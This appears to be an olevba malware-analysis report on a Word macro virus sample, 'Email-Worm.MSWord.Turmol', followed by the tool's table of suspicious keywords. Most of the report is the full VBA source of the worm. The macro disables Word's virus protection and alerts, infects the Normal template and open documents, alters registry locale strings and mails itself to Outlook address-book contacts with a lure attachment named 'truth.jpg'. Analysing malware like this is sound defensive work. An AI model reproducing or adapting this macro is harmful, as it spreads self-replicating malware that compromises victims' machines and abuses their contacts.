olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Turmol
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Turmol - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_open()
On Error Resume Next

With Options
.VirusProtection = 0
.SaveNormalPrompt = 0
.ConfirmConversions = 0
End With
With Application
.EnableCancelKey = wdCancelDisabled
.ScreenUpdating = 0
.DisplayAlerts = wdAlertsNone
.DisplayStatusBar = 0
End With

Set norm = NormalTemplate.VBProject.VBComponents
Set adoc = ActiveDocument.VBProject.VBComponents
Const virii = "W97M/Turmoil"

Open "c:\turmoil.vxd" For Output As #1
Print #1, Application.VBE.ActiveVBProject.VBComponents.Item(1).codemodule.lines(1, Application.VBE.ActiveVBProject.VBComponents.Item(1).codemodule.CountOfLines)
Close #1

If norm.Item(1).codemodule.lines(72, 1) <> "'w97m/turmoil" Then
norm.Item(1).codemodule.AddFromFile ("c:\turmoil.vxd")
End If
If adoc.Item(1).codemodule.lines(72, 1) <> "w97m/turmoil" Then
adoc.Item(1).codemodule.AddFromFile ("c:\turmoil.vxd")
End If

turmoil = Int(Rnd(13) + 1)
If turmoil = 13 Then
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\CONTROL PANEL\INTERNATIONAL", "s1159") = "Turmoil"
System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\CONTROL PANEL\INTERNATIONAL", "s2359") = "Turmoil"
End If

ActiveDocument.SaveAs = "c:\turmoil.doc"
Set outapp = CreateObject("outlook.application")
Set mapi = a.GetNameSpace("MAPI")
If outapp = "Outlook" Then
mapi.Logon "profile", "password"
For x = 1 To mapi.AddressLists.Count
Set y = mapi.AddressLists(y)
x = 1
Set tml = outapp.CreateItem(0)
For xx = 1 To d.AddressEntries.Count
e = y.AddressEntries(x)
tml.Recipients.Add e
x = x + 1
If x > 101 Then xx = y.AddressEntries.Count
Next xx
tml.Subject = "hello"
tml.Body = ".click to see the naked truth!"
tml.attachments.Add "c:\turmoil.doc", 1, 1, "truth.jpg"
tml.Send
e = ""
Next y
mapi.Logoff
End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

